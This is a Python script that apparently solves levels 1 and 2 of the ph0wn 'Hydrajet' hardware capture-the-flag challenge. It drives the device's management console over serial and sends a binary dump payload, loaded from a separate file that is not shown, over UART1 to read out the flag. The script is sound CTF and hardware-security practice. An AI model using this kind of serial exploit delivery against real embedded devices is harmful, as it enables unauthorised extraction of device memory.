#-------------------------------------------------------------------------------
# Name:        Hydrajet exploit
# Purpose:     Solution for ph0wn's challenge Hydrajet level 1 and 2
#              using a dump code over uart1
#
# Author:      Phil
#
# Created:     29/10/2023
# Copyright:   Copyleft
#-------------------------------------------------------------------------------


# usage:
# connect you hydrajet USB1 on port "managementPort"
# connect an USB<->serial converter to port "uart1Port"
# Pins on hydrajet for the uart1 connection: PA10 = RX, PA9 = TX
# (and don't forget the GND and !!!NO VCC!!!)

managementPort='COM6'
managementbaud=115200
uart1Port='COM7'
uart1Baud=9600

import serial, time, sys

def initManagementPort():
    global serManagement
    serManagement = serial.Serial()
    serManagement.port = managementPort

    serManagement.baudrate = managementbaud
    """
    serManagement.bytesize = serial.EIGHTBITS #number of bits per bytes
    serManagement.parity = serial.PARITY_NONE #set parity check: no parity
    serManagement.stopbits = serial.STOPBITS_ONE #number of stop bits
    #serManagement.timeout = None          #block read
    serManagement.timeout = 0            # non blocking read
    serManagement.xonxoff = False     #disable software flow control
    serManagement.rtscts = False     #disable hardware (RTS/CTS) flow control
    serManagement.dsrdtr = False       #disable hardware (DSR/DTR) flow control
    serManagement.writeTimeout = 2     #timeout for write
    """
    #serManagement.set_buffer_size(rx_size = 1)

    #serManagement.timeout = 0            # non blocking read

    try:
        serManagement.open()
    except Exception as e:
        print("error on opening serial management port " + str(e))
        exit()

    if not serManagement.isOpen():
        print("serial management port " + str(e) + "isn't opened")
        exit()

    time.sleep(0.3)
    print("serial management init done")

def printLineM():
    """
    raw = serManagement.read_until(b'\r')
    l = str(raw,'UTF-8')
    print(l,end='')
    """
    raw = serManagement.read_until(b'\r')
    print(raw,end='')

def printLineUntilM(endString):
    raw = serManagement.read_until(endString)
    l = str(raw,'UTF-8')
    print(l,end='')



def initUart1Port():
    global serUart1
    serUart1 = serial.Serial()
    serUart1.port = uart1Port

    serUart1.baudrate = uart1Baud
    """
    serUart.1bytesize = serial.EIGHTBITS #number of bits per bytes
    serUart1.parity = serial.PARITY_NONE #set parity check: no parity
    serUart1.stopbits = serial.STOPBITS_ONE #number of stop bits
    #serUart1.timeout = None          #block read
    serUart1.timeout = 0            # non blocking read
    serUart1.xonxoff = False     #disable software flow control
    serUart1.rtscts = False     #disable hardware (RTS/CTS) flow control
    serUart1.dsrdtr = False       #disable hardware (DSR/DTR) flow control
    serUart1.writeTimeout = 2     #timeout for write
    """
    #serUart1.set_buffer_size(rx_size = 1)

    #serUart1.timeout = 0            # non blocking read

    try:
        serUart1.open()
    except Exception as e:
        print("error on opening serial management port " + str(e))
        exit()

    if not serUart1.isOpen():
        print("serial management port " + str(e) + "isn't opened")
        exit()

    time.sleep(0.3)
    print("serial uart1 init done")



def main():
    initManagementPort()
    initUart1Port()

    serManagement.write(b'\r')
    printLineUntilM(b'> ')

    serManagement.write(b'agc\r')
    printLineUntilM(b'uart1> ')


    #level 1, get the flag. Just display the help function of the new "agc" mode
    serManagement.write(b'help\r')
    printLineUntilM(b'uart1> ')

    #level 2, send the exploit on uart1 and readback the flag
    serManagement.write(b'decode-agc\r')

    printLineM()
    printLineM()
    printLineM()

    exploit = open("dumpcode.bin", "rb").read()
    time.sleep(0.1)
    serUart1.write(exploit)

    printLineM()
    printLineM()

    print('\r\nFlag: ',end='')

    # push user button to print the flag!
    raw = serUart1.read_until(b'}')
    l = str(raw,'UTF-8')
    print(l,end='')


if __name__ == '__main__':
    main()

